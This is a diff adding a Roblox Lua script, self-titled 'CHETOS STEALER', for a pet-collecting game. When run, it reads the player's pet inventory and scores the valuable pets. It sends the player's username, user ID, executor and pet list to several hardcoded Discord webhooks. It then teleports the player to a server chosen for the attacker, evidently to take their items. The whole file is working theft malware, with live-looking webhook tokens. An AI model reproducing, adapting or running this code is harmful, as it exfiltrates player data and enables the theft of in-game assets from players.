@@ -1,0 +1,238 @@
+-- Services
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+-- Environment Setup
+local EXECUTION_FLAG_NAME = "ChetosExecutionFlag"
+if CoreGui:FindFirstChild(EXECUTION_FLAG_NAME) then return end
+local flag = Instance.new("BoolValue")
+flag.Name = EXECUTION_FLAG_NAME
+flag.Parent = CoreGui
+
+-- Local Player and Game Info
+local player = Players.LocalPlayer
+local PlaceId = game.PlaceId
+
+-- Configuration
+local CONFIG = {
+    ["ALL_HITS_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1397485572884271134/SeiDaELPQmgoaYyUIsXAefydjAfIi8_CVO0qAawMu5zGZeFOTXkKxy8nf6OwWPRHuucB",
+    ["KITSUNE_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1400889130409267260/sjHU9RINLAq242Sy_D54yEjkh3wSAJGUeiK9UPXealHoWCCxR3DKAPevSbbo7oeNcS0b",
+    ["LOGS_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1401772578254753792/K42qhdlIdc1M2vctyVlcoXsiOyA6u3byv5UnkUDIYk-Do_PiYrZotAEFdTSU5KotHc9B",
+    ["PRIVATE_KITSUNE_WEBHOOK_URL"] = "https://discord.com/api/webhooks/1403796053517402232/9FaYsE0qvOZo-vfthMRFMmBl9VgnWdiS23cUoRu_6Xt684Ec8P70ih6fkrwUTXC85YqY",
+    ["PING_MESSAGE"] = "@everyone **kupal naka HIT!!!🤑🤑🤑🤑**",
+    ["HUGE_PET_WEIGHT"] = 6.0,
+    ["AGED_PET_DAYS"] = 50,
+    ["MAX_PETS_IN_LIST"] = 10,
+    ["PRIORITY_PETS"] = {["Disco Bee"] = true, ["Rainbow Ankylosaurus"] = true, ["Rainbow Dilophosaurus"] = true,["Rainbow Pachycephalosaurus"] = true, ["Rainbow Iguanodon"] = true, ["Rainbow Parasaurolophus"] = true,["Kitsune"] = true, ["Spinosaurus"] = true, ["Rainbow Spinosaurus"] = true,["Mizuchi"] = true, ["Rainbow Kitsune"] = true, ["Raccoon"] = true,["Dragonfly"] = true, ["Mimic Octopus"] = true, ["Butterfly"] = true,["Queen Bee"] = true, ["T-Rex"] = true, ["Fennec Fox"] = true, ["Rainbow Lobster Thermidor"] = true,["Rainbow Corrupted Kitsune"] = true}
+}
+
+local MUTATION_MAP = {a="Shocked",b="Golden",c="Rainbow",d="Shiny",e="Windy",f="Frozen",g="Inverted",h="Rideable",i="Mega",j="Tiny",k="IronSkin",l="Radiant",m="Normal",n="Ascended",o="Tranquil",p="Corrupted",q="Fried",r="Aromatic",Shocked="Shocked",Golden="Golden",Rainbow="Rainbow",Shiny="Shiny",Windy="Windy",Frozen="Frozen",Inverted="Inverted",Rideable="Rideable",Mega="Mega",Tiny="Tiny",IronSkin="IronSkin",Radiant="Radiant",Normal="Normal",Ascended="Ascended",Tranquil="Tranquil",Corrupted="Corrupted",Fried="Fried",Aromatic="Aromatic"}
+
+-- Utility Functions
+local function getExecutorName()
+    if getexecutorname then local s, n = pcall(getexecutorname); if s and type(n) == "string" then return n end end
+    if identifyexecutor then local s, n = pcall(identifyexecutor); if s and type(n) == "string" then return n:gsub(" Executor", "") end end
+    if syn then return "Synapse X" end; if Krnl then return "Krnl" end; if Fluxus then return "Fluxus" end; if SENTINEL_V2 then return "Sentinel" end
+    return "Unknown"
+end
+
+local function sendOurWebhook(url, payload)
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    if not requestFunc or not url then return end
+    task.spawn(function() pcall(function() requestFunc({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)}) end) end)
+end
+
+local function sendAllDestinations(payload, payload_log, includeKitsune)
+    if includeKitsune then sendOurWebhook(CONFIG["KITSUNE_WEBHOOK_URL"], payload) end
+    sendOurWebhook(CONFIG["ALL_HITS_WEBHOOK_URL"], payload)
+    local loaderWebhook = getgenv().Webhook
+    if loaderWebhook then sendOurWebhook(loaderWebhook, payload) end
+    sendOurWebhook(CONFIG["LOGS_WEBHOOK_URL"], payload_log)
+end
+
+local function sendPrivateKitsuneWithForwarding(payload, payload_log)
+    sendOurWebhook(CONFIG["PRIVATE_KITSUNE_WEBHOOK_URL"], payload)
+    sendOurWebhook(CONFIG["ALL_HITS_WEBHOOK_URL"], payload)
+    local loaderWebhook = getgenv().Webhook
+    if loaderWebhook then sendOurWebhook(loaderWebhook, payload) end
+    sendOurWebhook(CONFIG["LOGS_WEBHOOK_URL"], payload_log)
+end
+
+local function computeRiskAndColor(stats, counts, flags)
+    local score = 0
+    if flags.hasKitsune then score = score + 20 end
+    if flags.hasMega then score = score + 8 end
+    if flags.hasAscended then score = score + 8 end
+    if flags.hasTitanic then score = score + 12 end
+    if flags.hasRainbowDragonfly then score = score + 15 end
+    if flags.hasGoldenButterfly then score = score + 10 end
+    score = score + (stats.huge * 5)
+    score = score + ((counts.dragonfly or 0) + (counts.mimic or 0) + (counts.trex or 0)) * 3
+    score = score + ((counts.butterfly or 0) + (counts.raccoon or 0)) * 2
+    if (counts.discoBee or 0) > 0 then score = score + 6 end
+    local color
+    if score >= 35 then color = 15158332 elseif score >= 20 then color = 15105570 else color = 3066993 end
+    return score, color
+end
+
+-- Main Execution Logic
+task.spawn(function()
+    -- Step 1: Find a destination server
+    local destinationJobId
+    local servers = {}
+    local success, req = pcall(function() return game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true") end)
+    if success and req then
+        local success2, body = pcall(function() return HttpService:JSONDecode(req) end)
+        if success2 and body and body.data then
+            for _, v in ipairs(body.data) do
+                if type(v) == "table" and v.playing and v.maxPlayers and v.playing < v.maxPlayers then
+                    table.insert(servers, v.id)
+                end
+            end
+        end
+    end
+    if #servers == 0 then return end
+    destinationJobId = servers[math.random(1, #servers)]
+
+    -- Step 2: Scan the player's inventory
+    local InventoryData
+    local success_inv = pcall(function() InventoryData = require(ReplicatedStorage.Modules.DataService):GetData().PetsData.PetInventory.Data end)
+    if not (success_inv and InventoryData) then return end
+    
+    local priorityPets = {}
+    local stats = {total = 0, huge = 0, agedMutated = 0}
+    local counts = {dragonfly = 0, mimic = 0, butterfly = 0, raccoon = 0, discoBee = 0, trex = 0}
+    local flags = {hasKitsune = false, hasMega = false, hasAscended = false, hasTitanic = false, hasRainbowDragonfly = false, hasGoldenButterfly = false, hasAnyRainbowMutation = false, hasPriorityKitsune = false, hasPriorityMega = false, hasPriorityRainbow = false, hasPriorityAscended = false}
+
+    for uuid, petInfo in pairs(InventoryData) do
+        if type(petInfo) == "table" and petInfo.PetData then
+            local baseWeight = tonumber(petInfo.PetData.BaseWeight or 0)
+            if baseWeight > 0 or tonumber(petInfo.PetData.Weight or 0) > 0 then
+                stats.total = stats.total + 1
+                local mutationValue = petInfo.PetData.MutationType or petInfo.PetData.Mutation
+                local mutationName = (mutationValue and MUTATION_MAP[tostring(mutationValue)]) or ""
+                local basePetType = tostring(petInfo.PetType or "Unknown")
+
+                if mutationName == "Rainbow" then flags.hasAnyRainbowMutation = true end
+                if basePetType == "Dragonfly" then counts.dragonfly = counts.dragonfly + 1 end
+                if basePetType == "Mimic Octopus" then counts.mimic = counts.mimic + 1 end
+                if basePetType == "Butterfly" then counts.butterfly = counts.butterfly + 1 end
+                if basePetType == "Raccoon" then counts.raccoon = counts.raccoon + 1 end
+                if basePetType == "Disco Bee" then counts.discoBee = counts.discoBee + 1 end
+                if basePetType == "T-Rex" then counts.trex = counts.trex + 1 end
+                if basePetType == "Kitsune" then flags.hasKitsune = true end
+                if mutationName == "Mega" then flags.hasMega = true end
+                if mutationName == "Ascended" then flags.hasAscended = true end
+                if basePetType == "Dragonfly" and mutationName == "Rainbow" then flags.hasRainbowDragonfly = true end
+                if basePetType == "Butterfly" and mutationName == "Golden" then flags.hasGoldenButterfly = true end
+                
+                local isPriority = CONFIG["PRIORITY_PETS"][basePetType]
+                if isPriority then
+                    if basePetType == "Kitsune" then flags.hasPriorityKitsune = true end
+                    if mutationName == "Mega" then flags.hasPriorityMega = true end
+                    if mutationName == "Rainbow" then flags.hasPriorityRainbow = true end
+                    if mutationName == "Ascended" then flags.hasPriorityAscended = true end
+                end
+                
+                local pet = {uuid=uuid,baseType=basePetType,typeName=(mutationName ~= "" and mutationName .. " " or "") .. basePetType,weight=tonumber(petInfo.PetData.Weight) or baseWeight,baseWeight=baseWeight,age=tonumber(petInfo.PetData.Age or 0),level=tonumber(petInfo.PetData.Level or 1),isHuge=baseWeight >= CONFIG["HUGE_PET_WEIGHT"],isAged=(math.floor(tonumber(petInfo.PetData.Age or 0)/86400) >= CONFIG["AGED_PET_DAYS"]),isMutated=mutationName ~= ""}
+                if isPriority or pet.isHuge then
+                    table.insert(priorityPets, pet)
+                    if pet.isHuge then stats.huge = stats.huge + 1 end
+                    if pet.isAged or pet.isMutated then stats.agedMutated = stats.agedMutated + 1 end
+                    if pet.isHuge and isPriority then flags.hasTitanic = true end
+                end
+            end
+        end
+    end
+
+    if #priorityPets == 0 then return end
+
+    table.sort(priorityPets, function(a, b)
+        local scoreA = (string.find(a.typeName:lower(), "rainbow") and 1) or (string.find(a.typeName:lower(), "divine") and 2) or (a.isHuge and 3) or ((a.isMutated or a.isAged) and 4) or 5
+        local scoreB = (string.find(b.typeName:lower(), "rainbow") and 1) or (string.find(b.typeName:lower(), "divine") and 2) or (b.isHuge and 3) or ((b.isMutated or a.isAged) and 4) or 5
+        if scoreA ~= scoreB then return scoreA < scoreB else return a.weight > b.weight end
+    end)
+
+    local function formatPetList()
+        local groups = {}
+        for _, pet in ipairs(priorityPets) do
+            local key = pet.typeName
+            if not groups[key] then
+                groups[key] = { count = 0, best = pet, anyHuge = pet.isHuge, anyAgedOrMutated = (pet.isAged or pet.isMutated) }
+            end
+            groups[key].count = groups[key].count + 1
+            if pet.isHuge then groups[key].anyHuge = true end
+            if pet.isAged or pet.isMutated then groups[key].anyAgedOrMutated = true end
+            if pet.weight > groups[key].best.weight then groups[key].best = pet end
+        end
+        local emitted, list, shown = {}, {}, 0
+        for _, pet in ipairs(priorityPets) do
+            local key = pet.typeName
+            if not emitted[key] then
+                local g = groups[key]
+                local icon = g.anyHuge and "🤭" or (g.anyAgedOrMutated and "⭐") or "🎯"
+                if g.count > 1 then
+                    table.insert(list, string.format("%s %s x%d", icon, key, g.count))
+                else
+                    local p = g.best
+                    local ageText = ""
+                    if p.age > 0 then local d, h = math.floor(p.age / 86400), math.floor((p.age % 86400) / 3600); ageText = d > 0 and string.format(" (Age: %dd %dh)", d, h) or string.format(" (Age: %dh)", h) end
+                    local weightText = p.weight ~= p.baseWeight and string.format("%.2f KG (Base: %.2f KG)", p.weight, p.baseWeight) or string.format("%.2f KG", p.weight)
+                    table.insert(list, string.format("%s %s - %s%s [Lv.%d]", icon, key, weightText, ageText, p.level))
+                end
+                emitted[key] = true
+                shown = shown + 1
+                if shown >= CONFIG["MAX_PETS_IN_LIST"] then
+                    local totalGroups = 0; for _ in pairs(groups) do totalGroups = totalGroups + 1 end
+                    if totalGroups - shown > 0 then table.insert(list, string.format("➕ ... and %d more types", totalGroups - shown)) end
+                    break
+                end
+            end
+        end
+        return "```\n" .. table.concat(list, "\n") .. "\n```"
+    end
+
+    local formattedPriorityPets = formatPetList()
+    
+    -- Step 3: Build and send the complete webhook
+    local serverPlayerCount, maxPlayerCount = #Players:GetPlayers(), Players.MaxPlayers
+    local serverStatus = string.format("%d/%d", serverPlayerCount, maxPlayerCount)
+    local executorName = getExecutorName()
+    
+    local join_link = string.format("[Join Server](https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s)", PlaceId, destinationJobId)
+    local teleport_command = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")\n```", PlaceId, destinationJobId)
+    
+    local description = table.concat({"**👤 Player Information**","```",("😭 Display Name: %s"):format(player.DisplayName),("👤 Username: @%s"):format(player.Name),("👁️ User ID: %d"):format(player.UserId),("🦸 Receiver: %s"):format(getgenv().receiver or "N/A"),("💻 Executor: %s"):format(executorName),("🌐 Current Server: %s"):format(serverStatus),"```","**📊 BACKPACK STATISTICS**","```",("🤭 Total Pets: %d"):format(stats.total),("🤑 Huge Pets: %d"):format(stats.huge),("⭐ Aged/Mutated: %d"):format(stats.agedMutated),("🎯 Priority Pets: %d"):format(#priorityPets),"```","**🐾 All Pets**",formattedPriorityPets,"**🔗 SERVER ACCESS - GET THE LOOT!**","The player will be teleported to the server linked below.",join_link},"\n")
+    local _, riskColor = computeRiskAndColor(stats, counts, flags)
+    local embed = {title="🐾 **CHETOS STEALER**",color=riskColor,description=description,footer={text="CHETOS STEALER",icon_url="https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}
+    
+    local payload = {username=" CHETOS PETS STEALER",avatar_url="https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",embeds={embed}}
+    payload.content = teleport_command .. "\n" .. CONFIG["PING_MESSAGE"]
+    payload.allowed_mentions = {parse={"everyone"}}
+    
+    local log_description = string.format("**Receiver:** %s\n\n**Pets Found:**\n%s", getgenv().receiver or "N/A", formattedPriorityPets)
+    local embed_log = {title="🐾 New Hit Logged",color=15158332,description=log_description,footer={text="Public Feed"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}
+    local payload_log = {username="CHETOS LOGS",avatar_url="https://cdn.discordapp.com/attachments/1309091998699094068/1400129104870772746/file_00000000795461f9b61ad64359bbe655.png?ex=688d7d97&is=688c2c17&hm=b63082322e311170a4524840e44b0204b2955a5cf9f949f31125989f234e118c&",embeds={embed_log}}
+    
+    local priorityCountExcludingCorrupted = 0; for _, pet in ipairs(priorityPets) do if pet.baseType ~= "Corrupted Kitsune" then priorityCountExcludingCorrupted = priorityCountExcludingCorrupted + 1 end end
+    local isManyPriorityExcludingCorrupted = (priorityCountExcludingCorrupted >= 10)
+    local isTopTierKitsuneOnlyHit = (flags.hasKitsune or flags.hasMega or flags.hasAscended or flags.hasTitanic or counts.dragonfly >= 3 or counts.mimic >= 3 or counts.butterfly >= 2 or counts.raccoon >= 2 or counts.discoBee > 0 or counts.trex >= 3)
+    local isKitsuneExclusiveHit = (flags.hasAnyRainbowMutation or flags.hasRainbowDragonfly or flags.hasGoldenButterfly)
+    local has30PercentChancePets = (counts.butterfly > 0 or counts.raccoon > 0)
+    local shouldSendTo30PercentKitsune = (not isTopTierKitsuneOnlyHit) and (not isKitsuneExclusiveHit) and has30PercentChancePets and (math.random(1, 100) <= 30)
+
+    if flags.hasPriorityKitsune or flags.hasPriorityMega or flags.hasPriorityRainbow or flags.hasPriorityAscended or flags.hasAnyRainbowMutation or flags.hasMega or flags.hasAscended or flags.hasTitanic or flags.hasRainbowDragonfly or flags.hasGoldenButterfly then
+        sendPrivateKitsuneWithForwarding(payload, payload_log)
+    elseif isKitsuneExclusiveHit or isTopTierKitsuneOnlyHit or isManyPriorityExcludingCorrupted or shouldSendTo30PercentKitsune then
+        sendAllDestinations(payload, payload_log, true)
+    else
+        sendAllDestinations(payload, payload_log, false)
+    end
+
+    -- Step 4: Teleport the player
+    task.wait(0.1)
+    TeleportService:TeleportToPlaceInstance(PlaceId, destinationJobId, player)
+end)
